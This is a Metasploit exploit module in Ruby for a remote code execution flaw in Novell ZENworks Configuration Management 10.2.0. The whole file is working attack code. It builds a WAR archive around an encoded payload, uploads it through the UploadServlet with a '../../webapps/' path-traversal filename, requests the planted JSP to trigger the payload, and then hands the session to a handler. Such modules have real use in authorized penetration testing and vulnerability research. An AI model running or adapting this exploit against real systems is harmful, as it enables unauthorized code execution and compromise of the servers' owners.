##
# $Id: zenworks_uploadservlet.rb 9419 2010-06-04 13:36:29Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Novell ZENworks Configuration Management Remote Execution',
			'Description' => %q{
					This module exploits a code execution flaw in Novell ZENworks Configuration Management 10.2.0.
				By exploiting the UploadServlet, an attacker can upload a malicious file outside of the TEMP directory 
				and then make a secondary request that allows for arbitrary code execution.
			},
			'Author'      => [ 'MC' ],
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision: 9419 $',
			'References'  =>
				[
					[ 'OSVDB', '63412' ],
					[ 'BID', '39114' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-078/' ],
					[ 'URL', 'http://tucanalamigo.blogspot.com/2010/04/pdc-de-zdi-10-078.html' ],
				],
			'Privileged'  => true,
			'Platform'    => [ 'win' ],
			'Targets'     =>
				[
					[ 'Windows Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						},
					],
				],
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(80),], self.class)
	end

	def exploit

		arch = target['Arch']
		plat = [Msf::Module::PlatformList.new(target['Platform']).platforms[0]]

		# Generate the WAR containing the EXE containing the payload
		app_base = rand_text_alphanumeric(4+rand(32-4))
		jsp_name = rand_text_alphanumeric(8+rand(8))
		war_data = Msf::Util::EXE.to_jsp_war(framework, arch, plat, payload.encoded, :jsp_name => jsp_name)

		res = send_request_cgi(
			{
				'uri'    => "/zenworks/UploadServlet?filename=../../webapps/#{app_base}.war",
				'method' => 'POST',
				'data'   => war_data,
				'headers' =>
					{
						'Content-Type' => 'application/octet-stream',
					}
			})

		print_status("Uploading #{war_data.length} bytes as #{app_base}.war ...")

		select(nil, nil, nil, 20)

		if (res.code == 200)
			print_status("Triggering payload at '/#{app_base}/#{jsp_name}.jsp' ...")
				send_request_raw(
					{
						'uri'    => "/#{app_base}/" + "#{jsp_name}" + '.jsp',
						'method' => 'GET',
					})
		else
			print_error("Denied...")
		end

		handler
	end

end
